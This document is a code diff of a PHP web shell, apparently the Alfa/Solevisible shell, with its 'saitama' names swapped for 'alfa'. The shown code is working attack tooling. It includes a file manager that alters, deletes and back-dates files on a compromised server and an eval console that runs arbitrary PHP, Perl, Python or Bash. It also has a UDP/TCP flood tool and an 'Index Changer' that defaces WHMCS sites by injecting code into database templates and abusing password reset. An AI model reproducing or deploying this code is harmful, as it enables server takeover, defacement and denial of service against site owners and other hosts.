+echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
 echo '</div>';
-switch($_POST['saitama2']){
+switch($_POST['alfa2']){
 case 'view':case 'edit':
 @chdir($_POST['c']);
 $disabled_btn = "";
-if(!@is_writable($_POST['saitama1'])&&!_saitama_is_writable($_POST['saitama1'])){
+if(!@is_writable($_POST['alfa1'])&&!_alfa_is_writable($_POST['alfa1'])){
 $disabled_btn = "disabled=disabled";
-$disabled_btn_style= 'background: #E6E6FA;color: #fff;';
+$disabled_btn_style= 'background: #ff0000;color: #fff;';
 }
-if(!empty($_POST['saitama3'])){
-$_POST['saitama3'] = substr($_POST['saitama3'],1);
-$time = @filemtime($_POST['saitama1']);
-$fp = @__write_file($_POST['saitama1'],$_POST['saitama3']);
-if($chdir_fals&&$saitama_canruncmd){
-	$rname = $saitama1_decoded;
+if(!empty($_POST['alfa3'])){
+$_POST['alfa3'] = substr($_POST['alfa3'],1);
+$time = @filemtime($_POST['alfa1']);
+$fp = @__write_file($_POST['alfa1'],$_POST['alfa3']);
+if($chdir_fals&&$alfa_canruncmd){
+	$rname = $alfa1_decoded;
 	$randname = $rname.rand(111,9999);
 	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
-	if($fp = @__write_file($filepath ,$_POST['saitama3'])){
-		saitamaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["saitama1"])."';rm -f '".addslashes($filepath)."'");
+	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
+		alfaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
 	}
 }
 if($fp){
 echo 'Saved!<br>';
-@touch($_POST['saitama1'],$time,$time);
+@touch($_POST['alfa1'],$time,$time);
 }
 }
-echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._saitama_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="saitamaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = saitama_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($saitama1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['saitama4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
-echo htmlspecialchars(__read_file($_POST['saitama1']));
+echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._alfa_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="alfaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = alfa_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($alfa1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
+echo htmlspecialchars(__read_file($_POST['alfa1']));
 echo '</pre></div></div>';
 break;
 case 'highlight':
 @chdir($_POST['c']);
-if(@is_readable($_POST['saitama1'])){
+if(@is_readable($_POST['alfa1'])){
 echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
-$code = @highlight_file($_POST['saitama1'],true);
+$code = @highlight_file($_POST['alfa1'],true);
 echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
 }
 break;
 case 'delete':
 @chdir($_POST['c']);
-if(@is_writable($_POST['saitama1'])||$GLOBALS["glob_chdir_false"]){
+if(@is_writable($_POST['alfa1'])||$GLOBALS["glob_chdir_false"]){
 $deleted = true;
-if(!@unlink($_POST['saitama1'])){
+if(!@unlink($_POST['alfa1'])){
 	$deleted = false;
-	if($saitama_canruncmd){
-		if(_saitama_is_writable($_POST['saitama1'])){
-			saitamaEx("rm -f '".addslashes($_POST['saitama1'])."'");
+	if($alfa_canruncmd){
+		if(_alfa_is_writable($_POST['alfa1'])){
+			alfaEx("rm -f '".addslashes($_POST['alfa1'])."'");
 			$deleted = true;
 		}
 	}
 }
-if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['saitama4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['saitama4'].'"];</script>';else echo 'Error...';}
+if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['alfa4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['alfa4'].'"];</script>';else echo 'Error...';}
 break;
 case 'chmod':
 @chdir($_POST['c']);
-if(!empty($_POST['saitama3'])){
+if(!empty($_POST['alfa3'])){
 $perms = 0;
-for($i=strlen($_POST['saitama3'])-1;$i>=0;--$i)
-$perms += (int)$_POST['saitama3'][$i]*pow(8, (strlen($_POST['saitama3'])-$i-1));
-if(!@chmod($_POST['saitama1'], $perms)){
-if($chdir_fals&&$saitama_canruncmd){
-saitamaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['saitama3'])." '".addslashes($saitama1_decoded)."'");
+for($i=strlen($_POST['alfa3'])-1;$i>=0;--$i)
+$perms += (int)$_POST['alfa3'][$i]*pow(8, (strlen($_POST['alfa3'])-$i-1));
+if(!@chmod($_POST['alfa1'], $perms)){
+if($chdir_fals&&$alfa_canruncmd){
+alfaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['alfa3'])." '".addslashes($alfa1_decoded)."'");
 echo('Success!');
 }else{
-echo '<font color="#00ffff"><b>Can\'t set permissions!</b></font><br><script>document.mf.saitama3.value="";</script>';}
+echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';}
 }else{echo('Success!');}
 }
 clearstatcache();
-saitamaNum(8,9,10,7,6,5,4,2,1);
+AlfaNum(8,9,10,7,6,5,4,2,1);
 if($chdir_fals){
 	$file_perm = $file_info[5];
 }else{
-	$file_perm = substr(sprintf('%o', @fileperms($_POST['saitama1'])),-4);
+	$file_perm = substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
 }
-echo '<script>saitama3_="";</script><form onsubmit="editor(\''.addslashes($_POST['saitama1']).'\',\''.$_POST['saitama2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['saitama4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
+echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
 break;
 case 'hexdump':
 @chdir($_POST['c']);
-$c = __read_file($_POST['saitama1']);
+$c = __read_file($_POST['alfa1']);
 $n = 0;
 $h = array('00000000<br>','','');
 $len = strlen($c);
@@ -3160,56 +3161,56 @@ echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 ce
 break;
 case 'rename':
 @chdir($_POST['c']);
-$saitama1_escape = addslashes($_POST["saitama1"]);
-$saitama3_escape = addslashes($_POST["saitama3"]);
-if(!empty($_POST['saitama3'])){
+$alfa1_escape = addslashes($_POST["alfa1"]);
+$alfa3_escape = addslashes($_POST["alfa3"]);
+if(!empty($_POST['alfa3'])){
 $cmd_rename = false;
-if($chdir_fals&&$saitama_canruncmd){
-if(_saitama_is_writable($_POST['saitama1'])){
-$saitama1_escape = addslashes($saitama1_decoded);
-saitamaEx("cd '".addslashes($_POST['c'])."';mv '".$saitama1_escape."' '".addslashes($_POST['saitama3'])."'");
+if($chdir_fals&&$alfa_canruncmd){
+if(_alfa_is_writable($_POST['alfa1'])){
+$alfa1_escape = addslashes($alfa1_decoded);
+alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa3'])."'");
 }else{
 $cmd_rename = true;
 }
 }else{
-$saitama1_escape = addslashes($_POST["saitama1"]);
+$alfa1_escape = addslashes($_POST["alfa1"]);
 }
-if(!@rename($_POST['saitama1'], $_POST['saitama3'])&&$cmd_rename){
-echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['saitama4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$saitama3_escape.'\',\''.$ftype.'\',\''.$_POST['saitama4'].'\')+"</div><div class=\'editor-file-name\'>'.$saitama3_escape.'</div>";editor_files["'.$_POST['saitama4'].'"].file = "'.$saitama3_escape.'";updateFileEditor("'.$saitama1_escape.'", "'.$saitama3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['saitama4']."','".$saitama1_escape."');":"").'}catch(e){console.log(e)}</script>');$saitama1_escape = $saitama3_escape;}
+if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cmd_rename){
+echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";updateFileEditor("'.$alfa1_escape.'", "'.$alfa3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');$alfa1_escape = $alfa3_escape;}
 }
-echo '<form onsubmit="editor(\''.$saitama1_escape.'\',\''.$_POST['saitama2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['saitama4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['saitama3'])&&$_POST['saitama3']!=''?$_POST['saitama3']:$saitama1_decoded)).'"><input type=submit value=" "></form>';
+echo '<form onsubmit="editor(\''.$alfa1_escape.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$alfa1_decoded)).'"><input type=submit value=" "></form>';
 break;
 case 'touch':
 @chdir($_POST['c']);
-if( !empty($_POST['saitama3']) ) {
-$time = strtotime($_POST['saitama3']);
+if( !empty($_POST['alfa3']) ) {
+$time = strtotime($_POST['alfa3']);
 if($time){
 $touched = false;
-if($chdir_fals&&$saitama_canruncmd){
-	saitamaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['saitama3']))."' '".addslashes($saitama1_decoded)."'");
+if($chdir_fals&&$alfa_canruncmd){
+	alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa3']))."' '".addslashes($alfa1_decoded)."'");
 	$touched = true;
 }
-if(!@touch($_POST['saitama1'],$time,$time)&&!$touched)
+if(!@touch($_POST['alfa1'],$time,$time)&&!$touched)
 echo 'Fail!';
 else
 echo 'Touched!';
 } else echo 'Bad time format!';
 }
 clearstatcache();
-echo '<script>saitama3_="";</script><form onsubmit="editor(\''.addslashes($_POST['saitama1']).'\',\''.$_POST['saitama2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['saitama4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['saitama1']))).'"><input type=submit value=" "></form>';
+echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['alfa1']))).'"><input type=submit value=" "></form>';
 break;
 case 'image':
 @chdir($_POST['c']);
 echo('<hr>');
-$file = $_POST['saitama1'];
+$file = $_POST['alfa1'];
 $image_info = @getimagesize($file);
 if(is_array($image_info)||$chdir_fals){
 $width = (int)$image_info[0];
 $height = (int)$image_info[1];
-if($chdir_fals&&$saitama_canruncmd){
-	$source = saitamaEx("cat '".addslashes($file)."' | base64");
-	list($width, $height) = explode(":", saitamaEx("identify -format '%w:%h' '".addslashes($file)."'"));
-	$mime = explode(":", saitamaEx("file --mime-type '".addslashes($file)."'"));
+if($chdir_fals&&$alfa_canruncmd){
+	$source = alfaEx("cat '".addslashes($file)."' | base64");
+	list($width, $height) = explode(":", alfaEx("identify -format '%w:%h' '".addslashes($file)."'"));
+	$mime = explode(":", alfaEx("file --mime-type '".addslashes($file)."'"));
 	$image_info['mime'] = $mime[1];
 }else{
 	$source = __ZW5jb2Rlcg(__read_file($file, false));
@@ -3221,11 +3222,11 @@ echo $content = "<div class='editor-view'><div class='view-content'><center>".$i
 break;
 }
 echo '</div>';
-saitamaFooter();
+alfaFooter();
 }
 function findicon($file,$type){
 $s = 'http://solevisible.com/icons/';
-$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','saitama','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
+$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
 if($type!='file'){
 return ($file=='..'?$s.'back.png':$s.'folder.png');
 }else{
@@ -3235,12 +3236,12 @@ $ext = strtolower($ext);
 return (in_array($ext,$types)?$s.$ext.'.png':$s.'notfound.png');
 }
 }
-function saitamadlfile(){
+function alfadlfile(){
 if(isset($_POST['c'],$_POST['file'])){
 $basename = rawurldecode(basename($_POST['file']));
 $_POST['file'] = str_replace("//", "/", $_POST['c'].'/'.$basename);
-$saitama_canruncmd = _saitama_can_runCommand(true,true);
-if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $saitama_canruncmd){
+$alfa_canruncmd = _alfa_can_runCommand(true,true);
+if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $alfa_canruncmd){
 ob_start("ob_gzhandler", 4096);
 header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
 header("Content-Type: application/octet-stream");
@@ -3248,30 +3249,30 @@ if($GLOBALS["glob_chdir_false"]){
 	$randname = $basename.rand(111,9999);
 	$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
 	$filepath = $scriptpath."/".$randname;
-	if(_saitama_is_writable($scriptpath)){
-		saitamaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
+	if(_alfa_is_writable($scriptpath)){
+		alfaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
 		readfile($filepath);
 		@unlink($filepath);
 	}else{
-		saitamaEx("cat '".addslashes($_POST["file"])."'");
+		alfaEx("cat '".addslashes($_POST["file"])."'");
 	}
 }else{
 	readfile($_POST['file']);
 }
 }else echo('Error...!');}}
-function __saitama_set_cookie($key, $value){
+function __alfa_set_cookie($key, $value){
 	$_COOKIE[$key] = $value;
 	@setcookie($key, $value, time()+(86400 * 7), '/');
 }
-function saitamaphpeval(){
+function alfaphpeval(){
 if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
 	$tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
 }else{
-	$tempdir = dirname(saitamaEx("mktemp"));
-	__saitama_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
+	$tempdir = dirname(alfaEx("mktemp"));
+	__alfa_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
 }
-saitamahead();
-if(isset($_POST['saitama2']) && ($_POST['saitama2'] == 'ini')){
+alfahead();
+if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'ini')){
 echo '<div class=header>';
 ob_start();
 $INI=ini_get_all();
@@ -3291,7 +3292,7 @@ $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
 $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
 echo str_replace('<h1','<h2', $tmp) .'</div><br>';
 }
-if(isset($_POST['saitama2']) && ($_POST['saitama2'] == 'info')) {
+if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'info')) {
 echo '<div class=header><style>.p {color:#000;}</style>';
 ob_start();
 phpinfo();
@@ -3300,7 +3301,7 @@ $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
 $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
 echo str_replace('<h1','<h2', $tmp) .'</div><br>';
 }
-if(isset($_POST['saitama2']) && ($_POST['saitama2'] == 'exten')) {
+if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'exten')) {
 echo '<div class=header>';
 ob_start();
 $EXT=get_loaded_extensions();
@@ -3308,29 +3309,29 @@ echo '<table border=0><tr><td class="listing">'.implode('</td></tr>'."\n".'<tr><
 echo '</div><br>';
 }
 $lang_html = "";
-foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $key=>$val){$lang_html .= '<option value="'.$key.'" '.($_POST["saitama3"]==$key?"selected":"").'>'.$val.'</option>';}
-echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$lang_html.'</select>'._saitama_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['saitama1'])?htmlspecialchars($_POST['saitama1']):"&lt;?php\n\n\techo('hello saitama !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
-echo '</form><pre id="PhpOutput" style="'.(empty($_POST['saitama1'])?'display:none;':'').'margin-top:5px;" class="ml1">';
-if(!empty($_POST['saitama1'])){
-if($_POST['saitama3']=="php"){
+foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $key=>$val){$lang_html .= '<option value="'.$key.'" '.($_POST["alfa3"]==$key?"selected":"").'>'.$val.'</option>';}
+echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$lang_html.'</select>'._alfa_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):"&lt;?php\n\n\techo('hello alfa !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
+echo '</form><pre id="PhpOutput" style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class="ml1">';
+if(!empty($_POST['alfa1'])){
+if($_POST['alfa3']=="php"){
 ob_start();
-eval('?>'.$_POST['saitama1']);
+eval('?>'.$_POST['alfa1']);
 $result = htmlspecialchars(ob_get_clean());
-}elseif(_saitama_can_runCommand()&&$GLOBALS["sys"]=="unix"){
-	$lang = $_POST['saitama3'];
+}elseif(_alfa_can_runCommand()&&$GLOBALS["sys"]=="unix"){
+	$lang = $_POST['alfa3'];
 	$filename = "temp".rand(11111,99999);
 	$temp = $tempdir."/".$filename ;
-	__write_file($filename, $_POST['saitama1']);
-	$result = saitamaEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
+	__write_file($filename, $_POST['alfa1']);
+	$result = alfaEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
 	@unlink($filename);
 	@unlink($temp);
 }
 echo '<textarea class="bigarea">'.$result.'</textarea>';
 }
 echo '</pre></div>';
-saitamafooter();
+alfafooter();
 }
-function saitamahash(){
+function alfahash(){
 if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
 if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
 $stringTools = array(
@@ -3358,16 +3359,16 @@ $stringTools = array(
 'str_rot13 (base64_encode(gzdeflate( $string , 9))) --> Encode' => 'str_rot13(__ZW5jb2Rlcg(gzdeflate($s,9)))',
 'gzinflate (base64_decode(str_rot13( $string ))) --> Decode' => '@gzinflate(__ZGVjb2Rlcg(str_rot13($s)))',
 );
-saitamahead();
+alfahead();
 echo '<div class=header>';
 echo "<form onSubmit='g(\"hash\",null,this.selectTool.value,this.input.value);return false;'><div class='txtfont'>Method:</div> <select name='selectTool' style='width:400px;'>";
 foreach($stringTools as $k => $v)
-echo "<option value='".htmlspecialchars($v)."' ".($_POST['saitama1']==$v?'selected':'').">".$k."</option>";
-echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['saitama1'])?'':htmlspecialchars(@$_POST['saitama2']))."</textarea></form>";
-if(!empty($_POST['saitama1'])){
-$string = addslashes($_POST['saitama2']);
+echo "<option value='".htmlspecialchars($v)."' ".($_POST['alfa1']==$v?'selected':'').">".$k."</option>";
+echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['alfa1'])?'':htmlspecialchars(@$_POST['alfa2']))."</textarea></form>";
+if(!empty($_POST['alfa1'])){
+$string = addslashes($_POST['alfa2']);
 $string = str_replace('\"','"',$string);
-$alg = $_POST['saitama1'];
+$alg = $_POST['alfa1'];
 $code = str_replace('$s',"'".$string."'",$alg);
 ob_start();
 eval('echo '.$code.';');
@@ -3376,22 +3377,22 @@ ob_end_clean();
 if(in_array($alg, $stringTools))echo '<textarea class="bigarea">'.htmlspecialchars($res).'</textarea>';
 }
 echo "</div>";
-saitamaFooter();
+alfaFooter();
 }
-function saitamados(){
-saitamahead();
+function alfados(){
+alfahead();
 echo '<div class=header>';
 echo '<center><p><div class="txtfont_header">| DOS |</div></p><form onSubmit="g(\'dos\',null,this.host.value,this.time.value,this.port.value,this.m.value); return false;"><div class="txtfont">Method : <select name="m" style="width:80px;"><option value="udp">UDP</option><option value="tcp">TCP</option></select> Host : <input name="host" type="text" value="localhost" size="25" /> Time : <input name="time" type="text" size="15" /> Port : <input name="port" type="text" size="10" /> <input type="submit" value=" " /></div></form></center><br>';
-if(!empty($_POST['saitama1']) && !empty($_POST['saitama2']) && !empty($_POST['saitama3'])){
+if(!empty($_POST['alfa1']) && !empty($_POST['alfa2']) && !empty($_POST['alfa3'])){
 echo __pre();
 $packets=0;
 ignore_user_abort(true);
-$exec_time=(int)$_POST['saitama2'];
+$exec_time=(int)$_POST['alfa2'];
 $time=time();
 $max_time=$exec_time+$time;
-$host=$_POST['saitama1'];
-$port=(int)$_POST['saitama3'];
-$method=$_POST['saitama4'];
+$host=$_POST['alfa1'];
+$port=(int)$_POST['alfa3'];
+$method=$_POST['alfa4'];
 $out = str_repeat('X',65000);
 while(1){
 $packets++;
@@ -3408,14 +3409,14 @@ echo "<center>$packets (" . @round(($packets*65)/1024, 2) . " MB) packets averag
 echo "</pre>";
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
 function __pre(){return('<pre id="strOutput" style="margin-top:5px" class="ml1">');}
-function saitamaIndexChanger(){
-saitamahead();
+function alfaIndexChanger(){
+alfahead();
 
 echo '<div class=header><center><p><div class="txtfont_header">| Index Changer |</div></p><h3><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,null,\'whmcs\')">| Whmcs | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,\'vb\',null)">| vBulletin | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,\'mybb\')">| MyBB | </a></h3></center>';
-if(isset($_POST['saitama3'])&&($_POST['saitama3'] == 'whmcs')){
+if(isset($_POST['alfa3'])&&($_POST['alfa3'] == 'whmcs')){
 echo __pre();
 
 echo "<center><center><div class='txtfont_header'>| Whmcs |</div>
@@ -3436,18 +3437,18 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By Ndraa & StrezzBoy</title><b>Hacked By Ndraa & StrezzBoy</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
-if(isset($_POST['saitama6'])){
+if(isset($_POST['alfa6'])){
 $s0levisible="Powered By Solevisible";
-$dbu = $_POST['saitama6'];
-$path = $_POST['saitama5'];
-$fname = $_POST['saitama4'];
-$dbn = $_POST['saitama7'];
-$dbp = $_POST['saitama8'];
-$dbh = $_POST['saitama9'];
-$index = $_POST['saitama10'];
+$dbu = $_POST['alfa6'];
+$path = $_POST['alfa5'];
+$fname = $_POST['alfa4'];
+$dbn = $_POST['alfa7'];
+$dbp = $_POST['alfa8'];
+$dbh = $_POST['alfa9'];
+$index = $_POST['alfa10'];
 $index = str_replace("\'","'",$index);
 $deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $solevisible = fopen("'.$fname.'","w"); fwrite($solevisible,$x);';
 $saveData = __ZW5jb2Rlcg($deface);
@@ -3463,18 +3464,18 @@ $result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
 $create = "insert into tblclients (email) values('solevisible@fbi.gov')";
 $result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version')){
-$saitamaSole = new saitamaCURL(true);
-$saveurl = $saitamaSole->Send($path."/pwreset.php");
+$AlfaSole = new AlfaCURL(true);
+$saveurl = $AlfaSole->Send($path."/pwreset.php");
 $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$saitamaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
+$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert('File Created...');
 echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
 }else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#00ffff\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#00ffff\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#00ffff\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
